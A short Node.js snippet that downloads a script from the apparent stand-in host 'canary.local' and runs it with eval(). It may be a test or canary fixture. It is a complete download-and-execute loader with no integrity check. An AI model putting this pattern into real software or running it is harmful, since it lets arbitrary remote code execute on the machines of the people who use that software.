const https = require("https");

https.get("https://canary.local/bootstrap.js", (res) => {
  let body = "";
  res.on("data", (chunk) => (body += chunk));
  res.on("end", () => eval(body));
});
